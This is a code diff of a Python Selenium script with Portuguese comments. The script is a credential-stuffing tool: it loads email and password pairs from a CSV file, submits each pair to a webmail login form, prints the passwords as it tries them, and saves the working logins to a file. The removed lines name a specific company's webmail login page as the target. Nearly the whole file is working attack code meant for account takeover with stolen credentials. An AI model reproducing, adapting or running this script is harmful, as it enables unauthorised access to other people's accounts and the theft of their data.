@@ -8,11 +8,11 @@ import pandas as pd
 import time
 from read_csv import read_csv
 
-# Caminho para o driver do navegador (ChromeDriver)
-chrome_driver_path = "chromedriver.exe"  # Ou o caminho correto no seu sistema
+# (ChromeDriver)
+chrome_driver_path = "chromedriver.exe"  
 
-# URL da plataforma de login
-LOGIN_URL = "https://webmail.ecovitaconstrutora.com.br/interface/root#/login"  # Substitua pelo site real
+# URL  de login
+LOGIN_URL = ""  
 
 INPUT_FILE = "emails_senhas.csv"
 VALID_OUTPUT = "logins_validos.csv"
@@ -20,7 +20,7 @@ INVALID_OUTPUT = "logins_invalidos.csv"
 
 # Configuração do Selenium
 options = webdriver.ChromeOptions()
-#options.add_argument("--headless")  # Executa sem abrir o navegador (remova para depuração)
+#options.add_argument("--headless") 
 service = Service(ChromeDriverManager().install())
 driver = webdriver.Chrome(service=service, options=options)
 
@@ -34,7 +34,7 @@ for email, senha in lista_emails_senha:
     print(f"Tentando login: {email} com senha {senha}")
     try:
         driver.get(LOGIN_URL)
-        time.sleep(1)  # Aguarde o carregamento da página
+        time.sleep(1) 
 
         # Localizar campos de entrada
         email_input = driver.find_element(By.ID, "loginUsernameBox")  
@@ -49,13 +49,13 @@ for email, senha in lista_emails_senha:
         senha_input.send_keys(senha)
         login_button.click()
         
-        time.sleep(2)  # Aguarde resposta
+        time.sleep(2)  
 
         if "dashboard" in driver.current_url: 
             print(f"✔ Login bem-sucedido: {email}")
             valid_logins.append((email, senha))
         else:
-            print(f"❌ Login falhou: {email}")
+            print(f"Login falhou: {email}")
             invalid_logins.append((email, senha))
     
     except Exception as e:
@@ -66,7 +66,6 @@ for email, senha in lista_emails_senha:
 print("logins validos: ", valid_logins)
 print("logins invalidos: ", invalid_logins)
 
-# Fechar o navegador
 driver.quit()
 
 # Salvar resultados
